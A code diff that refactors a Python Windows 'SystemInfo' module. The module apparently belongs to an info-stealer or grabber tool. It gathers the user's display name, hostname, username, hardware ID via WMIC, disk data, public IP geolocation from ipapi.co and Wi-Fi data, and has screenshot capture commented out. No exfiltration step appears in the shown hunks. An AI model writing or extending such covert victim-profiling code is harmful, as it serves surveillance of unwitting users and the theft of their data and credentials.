@@ -13,7 +13,8 @@ import wmi
 class SystemInfo():
     MODULE_NAME = "system_info"
     
-    def __init__(self) -> dict[str, Any]:
+    @classmethod
+    def run_module(cls) -> dict[str, Any]:
         # To keep the output readable, let's avoid screenshots just for now
         # image = ImageGrab.grab(
         #     bbox=None,
@@ -24,16 +25,17 @@ class SystemInfo():
         # image.save("screenshot.png")
 
         res = {
-            "user_data": self.user_data(),
-            "system_data": self.system_data(),
-            "disk_data": self.disk_data(),
-            "network_data": self.network_data(),
-            "wifi_data": self.wifi_data(),
+            "user_data": cls.user_data(),
+            "system_data": cls.system_data(),
+            "disk_data": cls.disk_data(),
+            "network_data": cls.network_data(),
+            "wifi_data": cls.wifi_data(),
         }
         
         return res
 
-    def user_data(self) -> dict[str, Any]:
+    @staticmethod
+    def user_data() -> dict[str, Any]:
         def display_name() -> str:
             GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
             NameDisplay = 3
@@ -46,17 +48,18 @@ class SystemInfo():
 
             return nameBuffer.value
 
-        display_name = display_name()
+        disp_name = display_name()
         hostname = os.getenv('COMPUTERNAME')
         username = os.getenv('USERNAME')
 
         return {
-            "display_name": display_name,
+            "display_name": disp_name,
             "hostname": hostname, 
             "username": username
         }
 
-    def system_data(self) -> dict[str, Any]:
+    @staticmethod
+    def system_data() -> dict[str, Any]:
         def get_hwid() -> str:
             try:
                 hwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
@@ -79,7 +82,8 @@ class SystemInfo():
             "hwid": hwid
         }
 
-    def disk_data(self) -> dict[str, Any]:
+    @staticmethod
+    def disk_data() -> dict[str, Any]:
         disk = ("{:<9} "*4).format("Drive", "Free", "Total", "Use%") + "\n"
         for part in psutil.disk_partitions(all=False):
             if os.name == 'nt':
@@ -94,7 +98,8 @@ class SystemInfo():
         }
 
     # hmm
-    def network_data(self) -> dict[str, Any]:
+    @staticmethod
+    def network_data() -> dict[str, Any]:
         def geolocation(ip: str) -> dict[str, Any]:
             url = f"https://ipapi.co/{ip}/json/"
             response = requests.get(url, headers={
@@ -124,7 +129,8 @@ class SystemInfo():
             "asn": geo_data["asn"]
         }
 
-    def wifi_data(self) -> dict[str, Any]:
+    @staticmethod
+    def wifi_data() -> dict[str, Any]:
         networks, out = [], ''
         try:
             wifi = subprocess.check_output(
